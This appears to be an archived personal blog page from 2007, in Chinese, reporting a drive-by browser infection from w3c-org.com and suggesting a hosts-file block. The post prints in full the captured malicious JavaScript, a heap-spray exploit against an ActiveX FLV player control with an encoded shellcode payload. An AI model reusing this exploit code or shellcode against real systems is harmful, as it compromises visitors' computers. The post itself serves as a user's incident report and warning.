@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>w3c-org.com病毒爆发 - Est's Blog</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="Est's Blog RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="w3c-org.com病毒爆发" />
+
+      <link rel="canonical" href="https://blog.est.im/yo2/540140" />
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    Est's Blog
+  </a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+
+        <li><a href="/category/archive.html" class="hamburger-menu-overlay-link active">archive</a></li>
+        <li><a href="/category/stderr.html" class="hamburger-menu-overlay-link">stderr</a></li>
+        <li><a href="/category/stdin.html" class="hamburger-menu-overlay-link">stdin</a></li>
+        <li><a href="/category/stdout.html" class="hamburger-menu-overlay-link">stdout</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+
+
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">w3c-org.com病毒爆发</h2>
+    <p class="post-date">Posted <time datetime="2007-11-19T12:13:17+08:00">2007-11-19</time> | <span>archive</span></p>
+  </header>
+
+  
+  <p>最近上cnBeta、Blueidea老是出现TheWorld假死，任务栏出现读取 http://www.w3c-org.com/0614.html 的信息……当时就感觉中马了。</p>
+<p>结果果然中了，Heap Overflow<br></p>
+<p>&nbsp;&lt;SCRIPT language="JavaScript"&gt;<br>
+var expires = new Date();<br>
+expires.setTime(expires.getTime() + 24 * 60 * 60 * 1000);<br>
+var set_cookie = document.cookie.indexOf("3Ware=");<br>
+if (set_cookie == -1){document.cookie = "3Ware=1;expires=" + expires.toGMTString<br>
+();<br>
+document.write('&lt;object id="gl" classid="clsid:F3E70CEA-956E-49CC-B444-73AFE593A<br>
+D7F"&gt;&lt;/object&gt;');<br>
+var helloworld2Address = 0×0c0c0c0c;<br>
+var shellcode = unescape("%u10eb%u4b5b%uc933%ub966%u029a%u3480%ufe0b%ufae2%u05eb<br>
+%uebe8%uffff%u17ff%ufcc4%ufefe%u94a1%ua7ce%u759a%u75ff%uf2be%u8e75%u53e2%u9675%u<br>
+75f6%u9409%ua7f9%u2416%ufeff%u1cfe%ube07%uc67e%u8b3d%u7704%udab8%u9196%ufe90%u96<br>
+fe%u8c8b%u9392%u94aa%ua7ff%uf875%u5e16%ufeff%u6bfe%u4a16%ufeff%u73fe%uc940%ufeff<br>
+%ua9fe%u0196%ufefe%u01fe%ufaa8%u39fd%ufe39%u80a2%ud080%ube39%u9bfa%u9b86%ua9fe%u<br>
+a801%ucdf6%uad25%ua9ad%ub873%uaec6%u01ad%ue2a8%u9294%u9096%u9a8a%uaa92%uff94%u75<br>
+a7%u16f8%uffa7%ufefe%u1675%ubefd%u75c2%ue2b6%u8675%ufdd2%u9a03%ueb75%ufece%ufefe<br>
+%u6c75%ufe56%ufefe%u0f96%udbb3%u962b%ub30f%u2bdb%u3796%ua0ac%u01ad%u6aca%ub871%u<br>
+39d6%ud2b8%u7fb3%uefce%u4696%ufecc%u96fe%uce46%ufefe%u4696%ufed7%u75fe%u6afa%ub9<br>
+9e%uf9c7%ufc8a%u071c%u8077%u9fce%u4696%uffe1%u96fe%ueb46%ufeff%u4696%ufe0e%u75fe<br>
+%u6afa%uc7b9%u8af9%u1cfc%u7707%uca80%ufe94%u9b96%ucd92%u96cc%u9b95%u908c%u94aa%u<br>
+a7ff%uf875%u2c16%ufefe%u75fe%ufd26%uc2be%u3e7d%u75e6%u9686%u05fd%u817d%ufeee%u8b<br>
+8a%ub175%ufdf2%u7f35%u90c7%u9a8a%u8b92%u759d%ufdd1%u7d15%ufe83%u8afe%u75a7%ufebb<br>
+%uba73%ufce6%u37cd%u40f1%uc4ee%u8a28%u3ff6%uf937%u34fd%u15be%uc50f%ud6b0%ue48b%u<br>
+d59e%ufdd1%uee91%uaaae%ufa94%ufa94%u01ab%ue6a8%u01a6%uce88%ubb71%u9ffe%ue315%ub0<br>
+c5%u8bd2%u9ee6%ud1d5%u91fd%uaeee%u94aa%u94fa%uabfa%ua801%ua6e6%u8801%u71ca%ufebb<br>
+%u7d9f%ufa3b%u5f15%u397d%u15ea%u757b%uea80%u94aa%u94fa%ua981%ua801%u39e6%u96f9%u<br>
+f4f6%ucdfe%u763e%ufab9%u0275%uec94%u55a7%u031c%u3998%udaba%uffc2%u75ff%u7302%uee<br>
+b9%uaea9%uafaf%uafaf%uafaf%u73af%uc978%ufeff%uaefe%ua801%u7ff2%u763a%ufeff%u3cfe<br>
+%ufede%ua801%u75ee%udaa8%ua5bf%ufdac%ufd1f%ufd1f%ufd1f%u7d1f%ufa12%uada4%u2475%u<br>
+091c%u01ac%uaf1e%u75a8%uc28b%u8a75%u86d0%u0bfd%u75a8%ude88%u0bfd%u37cd%ubfb7%ufd<br>
+53%ucd3b%uf125%uee40%u28c4%uf68a%u353f%ufdf9%ube24%u0f15%ue1c5%u198b%u75a0%udaa0<br>
+%u23fd%u7598%ub5f2%ua075%ufde2%u7523%u75fa%u3bfd%ua055%u3da7%u3f16%u0103%ucc01%u<br>
+6f8a%uc7f2%u831c%u877d%u18c7%u3766%u5842%u9d95%u2f77%u0eb1%u85b6%ue0c3%u9a5a%u7e<br>
+11%u5128%ub364%uce7f%ufeef%ufefe%ufefe%ufefe%ufefe%ufefe%ufefe%ufefe%ufefe%ufefe<br>
+%u96fe%u8a8a%uc48e%ud1d1%u8989%ud089%ucd89%ud39d%u8c91%ud099%u919d%ud193%ucd89%u<br>
+9bd0%u9b86%u00fe");<br>
+var hbshelloworld = 0×100000;<br>
+var payLoadSize = shellcode.length * 2;<br>
+var spraySlideSize = hbshelloworld - (payLoadSize+0×38);<br>
+var spraySlide = unescape("%u0c0c%u0c0c");<br>
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);<br>
+heapBlocks = (helloworld2Address - 0×100000)/hbshelloworld;<br>
+memory = new Array();<br>
+for (i=0;i&lt;heapBlocks;i++)<br>
+{<br>
+memory[i] = spraySlide + shellcode;<br>
+}<br>
+function getSpraySlide(spraySlide, spraySlideSize)<br>
+{<br>
+while (spraySlide.length*2&lt;spraySlideSize)<br>
+{<br>
+spraySlide += spraySlide;<br>
+}<br>
+spraySlide = spraySlide.substring(0,spraySlideSize/2);<br>
+return spraySlide;<br>
+}<br>
+var size_buff = 1070;<br>
+var x = unescape("%0c%0c%0c%0c");<br>
+while (x.length&lt;size_buff) x += x;<br>
+gl.FlvPlayerUrl = x;<br>
+}<br>
+&lt;/SCRIPT&gt;<br>
+&lt;script&gt;<br>
+if (set_cookie == -1){<br>
+location.reload();<br>
+}<br>
+&lt;/script&gt;</p>
+<p>网上搜索了一下应该是网关、IDC中了ARP病毒导致的。</p>
+<p>补救办法：<br>
+Win+R运行 <code>notepad %windir%\system32\drivers\etc\hosts</code><br>
+最后添加两行：</p>
+<pre>
+127.0.0.1       www.w3c-org.com
+127.0.0.1       w3c-org.com
+</pre>
+<p>搞定。</p>
+
+</article>
+
+
+<div class="comments">
+  <h2>Comments</h2>
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname = 'estblog';
+    var disqus_identifier = 'yo2/540140';
+    var disqus_url = location.href;
+    (function() {
+    var dsq = document.createElement('script'); 
+
+    dsq.type = 'text/javascript';
+    dsq.defer = true;
+    dsq.src = '//estblog.disqus.com/embed.js';
+    (document.getElementsByTagName('body')[0] || document.getElementsByTagName('head')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the comments.</noscript>
+</div>    </main>
+<script src="/theme/js/core.js"></script>
+
+  </body>
+
+</html>
